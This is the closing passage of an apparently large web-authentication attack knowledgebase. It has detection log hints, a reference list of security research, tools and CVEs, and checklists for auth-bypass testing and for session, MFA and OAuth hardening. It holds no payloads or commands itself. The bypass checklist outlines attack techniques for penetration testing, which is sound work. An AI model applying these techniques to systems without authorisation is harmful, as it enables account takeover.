# 5. Alert on token use from unexpected IPs

# Log analysis:
# - Authorization requests with unusual redirect_uris
# - Multiple authorization codes for same user
# - Token requests without corresponding authorization
# - Unusual client_id usage
```

---

## 29. References

### 29.1 Official Documentation

- [PortSwigger Web Security Academy - Authentication](https://portswigger.net/web-security/authentication)
- [PortSwigger Web Security Academy - Password-based Login](https://portswigger.net/web-security/authentication/password-based)
- [PortSwigger Web Security Academy - Multi-Factor Authentication](https://portswigger.net/web-security/authentication/multi-factor)
- [PortSwigger Web Security Academy - Other Authentication Mechanisms](https://portswigger.net/web-security/authentication/other-mechanisms)
- [PortSwigger Web Security Academy - OAuth](https://portswigger.net/web-security/oauth)
- [OWASP Top 10 - Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)
- [OWASP Web Security Testing Guide - Session Management](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/)
- [MDN - HTTP Authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication)
- [MDN - Using HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [MDN - Web Authentication API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API)
- [MDN - Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)

### 29.2 Research Papers & Articles

- [PortSwigger Research - Splitting the Email Atom](https://portswigger.net/research/splitting-the-email-atom)
- [PortSwigger Research - Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [PortSwigger Research - Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- [PortSwigger Research - Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [PortSwigger Research - Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [PortSwigger Research - HTTP/1 Must Die](https://portswigger.net/research/http1-must-die)
- [HackTricks - Login Bypass](https://book.hacktricks.wiki/en/pentesting-web/login-bypass/index.html)
- [HackTricks - 2FA/MFA/OTP Bypass](https://hacktricks.wiki/en/pentesting-web/2fa-bypass/index.html)
- [HackTricks - OAuth to Account Takeover](https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover/index.html)
- [HackTricks - Reset/Forgotten Password Bypass](https://hacktricks.wiki/en/pentesting-web/reset-forgotten-password-bypass/index.html)

### 29.3 GitHub Repositories

- [PayloadsAllTheThings - Authentication Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Authentication%20Bypass)
- [PayloadsAllTheThings - Authentication Bypass README](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Authentication%20Bypass/README.md)
- [0xspade Bug Bounty - Authentication](https://github.com/0xspade/bugbounty/tree/master/authentication)
- [PayloadBox - Authentication Bypass Payload List](https://github.com/payloadbox/authentication-bypass-payload-list)
- [SecLists - Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
- [SecLists - Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing)
- [Nuclei Templates - Exposed Panels](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/exposed-panels)
- [Nuclei Templates - Vulnerabilities](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities)
- [Nuclei](https://github.com/projectdiscovery/nuclei)
- [httpx](https://github.com/projectdiscovery/httpx)
- [katana](https://github.com/projectdiscovery/katana)
- [subfinder](https://github.com/projectdiscovery/subfinder)
- [interactsh](https://github.com/projectdiscovery/interactsh)
- [notify](https://github.com/projectdiscovery/notify)
- [uncover](https://github.com/projectdiscovery/uncover)
- [dnsx](https://github.com/projectdiscovery/dnsx)
- [naabu](https://github.com/projectdiscovery/naabu)
- [mapcidr](https://github.com/projectdiscovery/mapcidr)
- [asnmap](https://github.com/projectdiscovery/asnmap)
- [cdncheck](https://github.com/projectdiscovery/cdncheck)
- [tlsx](https://github.com/projectdiscovery/tlsx)
- [alterx](https://github.com/projectdiscovery/alterx)
- [HTTP Request Smuggler (Burp)](https://github.com/PortSwigger/http-request-smuggler)
- [Param Miner (Burp)](https://github.com/PortSwigger/param-miner)
- [smuggler](https://github.com/defparam/smuggler)
- [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome)
- [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [postMessage-tracker](https://github.com/fransr/postMessage-tracker)
- [pp-finder](https://github.com/yeswehack/pp-finder)
- [cariddi](https://github.com/edoardottt/cariddi)

### 29.4 Bug Bounty Writeups & Case Studies

- [Authentication Failure Exploitation Guide](https://infosecwriteups.com/authentication-failure-exploitation-guide-5d2f4c7b1e3a)
- [Advanced Authentication and Session Management Attack Techniques](https://medium.com/@filedescriptor/advanced-authentication-and-session-management-attack-techniques-2f4d7c1b5e3d)

### 29.5 CVE References

- CVE-2023-20198: Cisco IOS XE Web UI Authentication Bypass
- CVE-2023-20273: Cisco IOS XE Privilege Escalation
- CVE-2023-20274: Cisco IOS XE Lua Backdoor
- CVE-2023-46805: Ivanti Connect Secure Authentication Bypass
- CVE-2024-21887: Ivanti Connect Secure Command Injection
- CVE-2024-21893: Ivanti Connect Secure SSRF
- CVE-2024-22024: Ivanti Connect Secure Authentication Bypass (2nd vector)

---

## Appendix A: Quick Reference Cheat Sheet

### A.1 Auth Bypass Checklist

```
[ ] Test SQL injection in login fields
[ ] Test NoSQL injection in login fields
[ ] Test LDAP injection in login fields
[ ] Test XPath injection in login fields
[ ] Test response manipulation
[ ] Test parameter pollution
[ ] Test header-based bypass
[ ] Test path-based bypass
[ ] Test JWT manipulation
[ ] Test SAML wrapping
[ ] Test OAuth misconfigurations
[ ] Test session fixation
[ ] Test session puzzling
[ ] Test password reset poisoning
[ ] Test MFA bypass techniques
[ ] Test brute force protection
[ ] Test username enumeration
[ ] Test cache poisoning chains
[ ] Test request smuggling chains
[ ] Test parser confusion
[ ] Test gadget chains
[ ] Test race conditions
```

### A.2 Session Security Checklist

```
[ ] Session ID regenerated after login
[ ] Session ID regenerated after privilege change
[ ] Session invalidated on logout
[ ] Session invalidated on password change
[ ] Session invalidated on MFA change
[ ] Session has Secure flag
[ ] Session has HttpOnly flag
[ ] Session has SameSite flag
[ ] Session has appropriate Path/Domain
[ ] Session not in URL
[ ] Session not in logs
[ ] Session not in error messages
[ ] Idle timeout configured
[ ] Absolute timeout configured
[ ] Concurrent session limit enforced
[ ] Session binding to IP/UA (optional)
```

### A.3 MFA Security Checklist

```
[ ] MFA enforced for all users
[ ] MFA enforced for sensitive actions
[ ] MFA not bypassable via response manipulation
[ ] MFA not bypassable via parameter tampering
[ ] MFA not bypassable via session fixation
[ ] MFA disable requires re-authentication
[ ] MFA disable requires password confirmation
[ ] Backup codes have sufficient entropy
[ ] Backup codes invalidated after use
[ ] OTP has reasonable length (6+ digits)
[ ] OTP has time window limits
[ ] OTP not reusable
[ ] Push notifications have rate limiting
[ ] Push notifications have fraud detection
```

### A.4 OAuth Security Checklist

```
[ ] redirect_uri validated against whitelist
[ ] state parameter required and validated
[ ] state parameter has sufficient entropy
[ ] scope validated server-side
[ ] authorization code single-use
[ ] authorization code time-limited
[ ] access token not in URL
[ ] ID token not accepted as access token
[ ] PKCE enforced for public clients
[ ] Dynamic client registration restricted
[ ] Token binding to client
[ ] Refresh token rotation
```

---

> **End of Knowledgebase**
> 
> This document is a living resource. Update it regularly with new research, payloads, and techniques.
> 
> **Last Updated:** 2026-05-24
> **Total Sections:** 29
> **Total Payloads:** 500+
> **Total Tools:** 30+
> **Total Case Studies:** 5
